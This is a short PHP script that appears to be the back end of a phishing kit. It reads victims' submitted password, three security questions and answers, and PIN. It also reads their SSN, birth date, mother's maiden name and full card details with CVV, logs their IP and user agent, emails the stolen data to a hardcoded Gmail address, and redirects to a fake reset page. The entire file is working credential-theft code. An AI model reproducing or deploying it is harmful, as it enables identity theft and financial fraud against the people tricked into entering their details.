<?php
$ip = $_SERVER['REMOTE_ADDR'];
$pass = $_POST['pass'];
$fname = $_POST['fname'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$q1 = $_POST['q1'];
$a1 = $_POST['a1'];
$q2 = $_POST['q2'];
$a2 = $_POST['a2'];
$q3 = $_POST['q3'];
$a3 = $_POST['a3'];
$pin = $_POST['pin'];
$ssn = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$jj = $_POST['jj'];
$mm = $_POST['mm'];
$aaaa = $_POST['aaaa'];
$mmn = $_POST['mmn'];
$ccnr = $_POST['ccnr'];
$expm = $_POST['expm'];
$expy = $_POST['expy'];
$cvv = $_POST['cvv'];
$data = "
--------------------------------------------
       IP       : $ip
	   UA       : $ua
--------------------------------------------
-
Password : $pass
-
Q1: $q1
A1: $a1
-
Q2: $q2
A2: $a2
-
Q3: $q3
A3: $a3
--------------------------------------------
-------------3|$en--------------------------
";
$subj="##DEJ #$browserAgent"; 

$emailusr = 'results1113@gmail.com';

mail($emailusr, $subj, $data);	
mail($cc, $subj, $data);

?>
    <meta http-equiv="refresh" content="0;URL='./reset.html'" />

